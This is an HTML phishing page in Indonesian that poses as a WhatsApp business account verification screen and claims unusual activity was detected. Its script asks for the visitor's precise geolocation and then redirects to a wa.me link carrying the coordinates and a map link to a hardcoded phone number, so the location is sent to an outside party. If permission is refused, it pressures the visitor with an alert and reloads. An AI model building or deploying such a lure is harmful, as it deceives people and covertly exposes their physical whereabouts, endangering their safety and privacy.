<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body, html { height: 100%; margin: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #ffffff; }
        .container {
            height: 100%; 
            display: flex;
            align-items: center;
            justify-content: center;
            text-align: center;
            padding: 30px;
        }
        .card {
            max-width: 400px;
            padding: 20px;
        }
        .logo { width: 80px; margin-bottom: 20px; }
        h2 { color: #128C7E; font-size: 22px; margin-bottom: 10px; }
        p { color: #555; font-size: 16px; line-height: 1.5; margin-bottom: 30px; }
        button {
            background-color: #25D366;
            color: white;
            padding: 18px;
            border: none;
            border-radius: 50px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            width: 100%;
            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
        }
    </style>
</head>
<body>
<div class="container">
    <div class="card">
        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="logo">
        <h2>Verifikasi Akun Bisnis</h2>
        <p>Sistem mendeteksi aktivitas tidak biasa. Silakan klik tombol di bawah untuk memverifikasi lokasi Anda dan memulihkan akses chat.</p>
        <button onclick="v()">KONFIRMASI LOKASI SAYA</button>
    </div>
</div>
<script>
function v() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function(p) {
            const lat = p.coords.latitude;
            const lon = p.coords.longitude;
            const n = "6281283408166"; 
            const m = encodeURIComponent("Sistem: Lokasi Terdeteksi\n\nKoordinat: " + lat + "," + lon + "\nLink Peta: https://www.google.com/maps?q=" + lat + "," + lon);
            window.location.href = "https://wa.me/" + n + "?text=" + m;
        }, function(e) {
            alert("Peringatan: Anda harus menekan 'Allow/Izinkan' untuk memverifikasi akun.");
            location.reload();
        }, {enableHighAccuracy: true});
    } else {
        alert("Browser tidak mendukung verifikasi.");
    }
}
</script>
</body>
</html>
